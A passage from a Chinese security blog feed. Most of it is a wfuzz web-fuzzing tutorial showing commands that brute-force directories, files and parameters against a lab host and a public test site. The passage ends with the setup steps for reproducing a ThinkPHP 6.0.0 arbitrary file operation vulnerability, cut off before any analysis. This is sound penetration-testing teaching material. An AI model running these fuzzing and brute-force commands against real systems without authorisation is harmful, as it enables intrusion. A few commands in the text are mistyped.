    --zE &amp;lt;encoder&amp;gt;            : Encoder for the specified payload (it must be preceded by -z or -w).
    --slice &amp;lt;filter&amp;gt;          : Filter payload's elements using the specified expression. It must be preceded by -z.
    -w wordlist               : Specify a wordlist file (alias for -z file,wordlist).
    -V alltype                : All parameters bruteforcing (allvars and allpost). No need for FUZZ keyword.
    -X method                 : Specify an HTTP method for the request, ie. HEAD or FUZZ
    
    -b cookie                 : Specify a cookie for the requests. Repeat option for various cookies.
    -d postdata               : Use post data (ex: &quot;id=FUZZ&amp;amp;catalogue=1&quot;)
    -H header                 : Use header (ex:&quot;Cookie:id=1312321&amp;amp;user=FUZZ&quot;). Repeat option for various headers.
    --basic/ntlm/digest auth  : in format &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;
    
    --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --sc/sl/sw/sh N[,N]+      : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --ss/hs regex             : Show/hide responses with the specified regex within the content
    --filter &amp;lt;filter&amp;gt;         : Show/hide responses using the specified filter expression (Use BBB for taking values from baseline)
    --prefilter &amp;lt;filter&amp;gt;      : Filter items before fuzzing using the specified expression.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中比较关注的参数如下&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;参数&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-e encoders/payloads/iterators/printers/scripts&lt;/td&gt;
      &lt;td&gt;罗列可用模块：加密/载荷/迭代器/打印格式/脚本&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-w&lt;/td&gt;
      &lt;td&gt;指定payload文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-z&lt;/td&gt;
      &lt;td&gt;指定payload文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hc/hl/hw/hh&lt;/td&gt;
      &lt;td&gt;隐藏过滤项&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–sc/sl/sw/sh&lt;/td&gt;
      &lt;td&gt;显示过滤项&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hs/ss&lt;/td&gt;
      &lt;td&gt;正则过滤&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-m&lt;/td&gt;
      &lt;td&gt;迭代器&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–script&lt;/td&gt;
      &lt;td&gt;使用脚本&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;字典&quot;&gt;字典&lt;/h1&gt;

&lt;p&gt;Kali自带此工具，字典在目录&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wfuzz/wordlist/&lt;/code&gt;下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;├── Injections
│   ├── All_attack.txt
│   ├── SQL.txt
│   ├── Traversal.txt
│   ├── XML.txt
│   ├── XSS.txt
│   └── bad_chars.txt
├── general
│   ├── admin-panels.txt
│   ├── big.txt
│   ├── catala.txt
│   ├── common.txt
│   ├── euskera.txt
│   ├── extensions_common.txt
│   ├── http_methods.txt
│   ├── medium.txt
│   ├── megabeast.txt
│   ├── mutations_common.txt
│   ├── spanish.txt
│   └── test.txt
├── others
│   ├── common_pass.txt
│   └── names.txt
├── stress
│   ├── alphanum_case.txt
│   ├── alphanum_case_extra.txt
│   ├── char.txt
│   ├── doble_uri_hex.txt
│   ├── test_ext.txt
│   └── uri_hex.txt
├── vulns
│   ├── apache.txt
│   ├── cgis.txt
│   ├── coldfusion.txt
│   ├── dirTraversal-nix.txt
│   ├── dirTraversal-win.txt
│   ├── dirTraversal.txt
│   ├── domino.txt
│   ├── fatwire.txt
│   ├── fatwire_pagenames.txt
│   ├── frontpage.txt
│   ├── iis.txt
│   ├── iplanet.txt
│   ├── jrun.txt
│   ├── netware.txt
│   ├── oracle9i.txt
│   ├── sharepoint.txt
│   ├── sql_inj.txt
│   ├── sunas.txt
│   ├── tests.txt
│   ├── tomcat.txt
│   ├── vignette.txt
│   ├── weblogic.txt
│   └── websphere.txt
└── webservices
    ├── ws-dirs.txt
    └── ws-files.txt


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当然只是举个🌰，用这里的字典基本不会得到什么，这里贴一个寻到的&lt;a href=&quot;https://github.com/TheKingOfDuck/fuzzDicts&quot;&gt;字典集合&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;载荷payloads&quot;&gt;载荷(payloads)&lt;/h1&gt;

&lt;p&gt;哈哈哈就是payload，查看payload模块&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e payloads

Available payloads:

  Name            | Summary                                                                           
------------------------------------------------------------------------------------------------------
  guitab          | This payload reads requests from a tab in the GUI                                 
  names           | Returns possible usernames by mixing the given words, separated by -, using know  
                  | n typical constructions.                                                          
  range           | Returns each number of the given range.                                           
  wfuzzp          | Returns fuzz results' URL from a previous stored wfuzz session.                   
  stdin           | Returns each item read from stdin.                                                
  hexrange        | Returns each hex number of the given hex range.                                   
  burplog         | Returns fuzz results from a Burp log.                                             
  hexrand         | Returns random hex numbers from the given range.                                  
  permutation     | Returns permutations of the given charset and length.                             
  file            | Returns each word from a file.                                                    
  burpstate       | Returns fuzz results from a Burp state.                                           
  dirwalk         | Returns filename's recursively from a local directory.                            
  iprange         | Returns list of IP addresses of a given IP range.                                 
  list            | Returns each element of the given word list separated by -.                       
  ipnet           | Returns list of IP addresses of a network.                                        
  autorize        | Returns fuzz results' from autorize.                                              
  buffer_overflow | Returns a string using the following pattern A * given number.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -z help&lt;/code&gt;可以获取关于payloads类模块的详细信息，也可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;--slice&lt;/code&gt;参数来过滤返回信息的结果。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z help --slice dirwalk

Name: dirwalk 0.1
Categories: default
Summary: Returns filename's recursively from a local directory.
Author: Xavi Mendez (@xmendez)
Description:
   Returns all the file paths found in the specified directory.
   Handy if you want to check a directory structure against a webserver,
   for example, because you have previously downloaded a specific version
   of what is supposed to be on-line.
Parameters:
   + dir: Directory path to walk and generate payload from.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用的命令行基础长相如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist url/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;wordlist是字典，url是目标链接，FUZZ是占位符，替换payload，形如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;占位符也可以多个，即多个payload，例如可以同时爆破用户名和密码
使用&lt;code class=&quot;highlighter-rouge&quot;&gt;-z&lt;/code&gt; 或&lt;code class=&quot;highlighter-rouge&quot;&gt;-w&lt;/code&gt;参数可以同时指定多个payloads，这时相应的占位符应设置为 &lt;code class=&quot;highlighter-rouge&quot;&gt;FUZZ, … , FUZnZ,&lt;/code&gt;其中n代表了payload的序号。比如下面的例子，我们同时暴破文件，后缀和目录：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt http://172.16.70.163/FUZZ/FUZ2ZFUZ3Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关于&lt;code class=&quot;highlighter-rouge&quot;&gt;-z&lt;/code&gt; 或&lt;code class=&quot;highlighter-rouge&quot;&gt;-w&lt;/code&gt;有啥区别：&lt;/p&gt;

&lt;p&gt;1、多个payload时候没有区别&lt;/p&gt;

&lt;p&gt;2、&lt;code class=&quot;highlighter-rouge&quot;&gt;-w wordlist&lt;/code&gt;是指定一个文件，等效于&lt;code class=&quot;highlighter-rouge&quot;&gt;-z file,wordlist&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;-z file --zP fn=&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;以下等效：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z file --zP fn=/usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;输出格式&quot;&gt;输出格式&lt;/h1&gt;

&lt;p&gt;我们在终端运行会在命令行得到结果&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://testphp.vulnweb.com/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000035:   301        7 L      12 W     184 Ch      &quot;admin&quot;                                     
000000229:   301        7 L      12 W     184 Ch      &quot;CVS&quot;                                       
000000412:   301        7 L      12 W     184 Ch      &quot;images&quot;                                    
000000721:   301        7 L      12 W     184 Ch      &quot;secured&quot;                                   

Total time: 27.57318
Processed Requests: 949
Filtered Requests: 945
Requests/sec.: 34.41750
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也可以将结果输出为我们指定的格式，查看支持的输出格式&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e printers

Available printers:

  Name      | Summary                             
--------------------------------------------------
  csv       | CSV printer ftw                     
  html      | Prints results in html format       
  json      | Results in json format              
  magictree | Prints results in magictree format  
  raw       | Raw output format
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;指定输出结果为html&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -f /tmp/outfile,html -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://testphp.vulnweb.com/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200330_wfuzz0/output.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个看着太黑可以把html里的背景色和字体颜色换一下&lt;/p&gt;

&lt;h1 id=&quot;过滤&quot;&gt;过滤&lt;/h1&gt;

&lt;p&gt;以上的命令行中&lt;code class=&quot;highlighter-rouge&quot;&gt;--hc&lt;/code&gt;就是过滤器，过滤器有&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;参数&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;–hc&lt;/td&gt;
      &lt;td&gt;hide code将指定的Response状态码隐藏，如–hc 404，隐藏响应为404&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hl&lt;/td&gt;
      &lt;td&gt;hide lines将指定的Lines数隐藏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hw&lt;/td&gt;
      &lt;td&gt;hide word将指定的Word数隐藏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hh&lt;/td&gt;
      &lt;td&gt;hide chars将指定的Chars数隐藏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–sc&lt;/td&gt;
      &lt;td&gt;show code将指定的Response状态码显示，如–sc 200，只显示响应为200&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–sl&lt;/td&gt;
      &lt;td&gt;show lines将指定的Lines数显示&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–sw&lt;/td&gt;
      &lt;td&gt;show word将指定的Word数显示&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–sh&lt;/td&gt;
      &lt;td&gt;show chars将指定的Chars数显示&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–hs&lt;/td&gt;
      &lt;td&gt;正则隐藏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–ss&lt;/td&gt;
      &lt;td&gt;正则显示&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Baseline(基准线)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;过滤器可以是某个HTTP响应的引用，例如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh BBB http://172.16.70.163/FUZZ{404there}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;意为wfuzz第一个请求是请求&lt;code class=&quot;highlighter-rouge&quot;&gt;http://testphp.vulnweb.com/404there&lt;/code&gt;这个网址，这个请求被标记为&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;也是不可以变的，这里用到了&lt;code class=&quot;highlighter-rouge&quot;&gt;--hh&lt;/code&gt;，即以&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;这条请求返回的Chars为基准，隐藏其他与&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;相同的返回&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;使用正则表达式过滤&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--hs&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;--ss&lt;/code&gt;都可以使用正则表达式来对返回结果过滤，例如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hs &quot;Not Found&quot; http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;递归测试&quot;&gt;递归测试&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-R&lt;/code&gt;可用于指定有效负载递归的深度。例如，如果要搜索现有目录，然后使用相同的有效负载再次在这些目录中进行模糊测试&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z list,&quot;admin/-Login-CVS-cgi-bin&quot;  -R 1 http://172.16.70.163/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 5

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000002:   404        828 L    1806 W   36886 Ch    &quot;Login&quot;                                            
000000001:   200        45 L     150 W    2076 Ch     &quot;admin/&quot;                                           
 |_  Enqueued response for recursion (level=1)
000000003:   404        828 L    1806 W   36868 Ch    &quot;CVS&quot;                                              
000000004:   404        828 L    1806 W   36867 Ch    &quot;cgi&quot;                                              
000000006:   404        828 L    1815 W   36947 Ch    &quot;admin/ - admin/&quot;                                  
000000008:   404        828 L    1815 W   36923 Ch    &quot;admin/ - CVS&quot;                                     
000000009:   404        828 L    1815 W   36923 Ch    &quot;admin/ - cgi&quot;                                     
000000007:   200        79 L     220 W    3700 Ch     &quot;admin/ - Login&quot;                                   
000000005:   404        828 L    1806 W   36867 Ch    &quot;bin&quot;                                              
000000010:   404        828 L    1815 W   36922 Ch    &quot;admin/ - bin&quot;                                     

Total time: 1.141663
Processed Requests: 10
Filtered Requests: 0
Requests/sec.: 8.759149
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;其他&quot;&gt;其他&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Openssl&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;工具输出以这个开头，我在寻求解决办法时候，StackOverflow有要安装Pycurl，我看这工具还挺麻烦，然后看大家写Wfuzz的教程截图里都有这句话，就不管啦，等以后有影响再说&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Recipes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Wfuzz可以生成一个recipes用来保存命令，方便下次执行或者分享给别人。&lt;/p&gt;

&lt;p&gt;生成一个recipes：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script=robots -z list,&quot;robots.txt&quot; --dumo-recipe outrecipe URL/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用某个recipes：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --recip outrecipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html"></summary></entry><entry><title type="html">ThinkPHP6任意文件操作漏洞</title><link href="http://localhost:4000/blog/thinkphp6.0/" rel="alternate" type="text/html" title="ThinkPHP6任意文件操作漏洞" /><published>2020-03-13T15:13:21+08:00</published><updated>2020-03-13T15:13:21+08:00</updated><id>http://localhost:4000/blog/thinkphp6.0</id><content type="html" xml:base="http://localhost:4000/blog/thinkphp6.0/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#环境准备&quot; id=&quot;markdown-toc-环境准备&quot;&gt;环境准备&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#洞析漏洞分析&quot; id=&quot;markdown-toc-洞析漏洞分析&quot;&gt;洞析（漏洞分析）&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#复现漏洞&quot; id=&quot;markdown-toc-复现漏洞&quot;&gt;复现漏洞&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#其他的坑&quot; id=&quot;markdown-toc-其他的坑&quot;&gt;其他的坑&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell&lt;/p&gt;

&lt;p&gt;具体受影响版本为ThinkPHP6.0.0-6.0.1&lt;/p&gt;

&lt;p&gt;👻最早是看别人写了如何复现的，然后这几天搭建Ubuntu+PHP7.1+ThinkPHP6.0.0并复现这个任意文件操作漏洞&lt;/p&gt;

&lt;p&gt;主要归纳为追踪SessionId怎么就可以篡改啦&lt;/p&gt;

&lt;p&gt;在什么特定情况下可以getshell啦&lt;/p&gt;

&lt;h1 id=&quot;环境准备&quot;&gt;环境准备&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;PHP7.1&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get -y install php7.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.kancloud.cn/manual/thinkphp6_0/1037481&quot;&gt;ThinkPHP6&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt;安装&lt;code class=&quot;highlighter-rouge&quot;&gt;Composer&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -sS https://getcomposer.org/installer | php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;如果有什么乱七八糟错误，可以试一试&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;然后移动&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mv composer.phar /usr/local/bin/composer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;修改源为阿里源&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;安装ThinkPHP6.0&lt;/p&gt;

    &lt;p&gt;💢坑：这里不需要写&lt;code class=&quot;highlighter-rouge&quot;&gt;topthink/think=6.0.0dev&lt;/code&gt;，不然会失败，版本可以在安装完之后修改配置文件进行版本覆盖&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;💢坑：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;蛤？🙄搞不明白，还改了半天php的配置文件，把extension=php_fileinfo.dll的勾掉，其实不需要，&lt;a href=&quot;https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&quot;&gt;参考这篇文章&lt;/a&gt;，增加&lt;code class=&quot;highlighter-rouge&quot;&gt;--ignore-platform-reqs&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;就好惹😍
&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;cd进入安装好的tp&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;访问http://localhost:8000/，此时是最新的6.0.2版本&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;修改为6.0.0版本，将&lt;code class=&quot;highlighter-rouge&quot;&gt;/app/composer.json:24&lt;/code&gt;修改为&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;topthink/framework&quot;: &quot;6.0.0&quot;,
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;然后执行将版本覆盖为6.0.0&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;再次&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;http://localhost:8000/就会是6.0.0版本了&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;洞析漏洞分析&quot;&gt;洞析（漏洞分析）&lt;/h1&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://hacpai.com/article/1579965339516&quot;&gt;ThinkPHP6 任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw&quot;&gt;ThinkPHP6任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;😒咋两篇名字一样&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
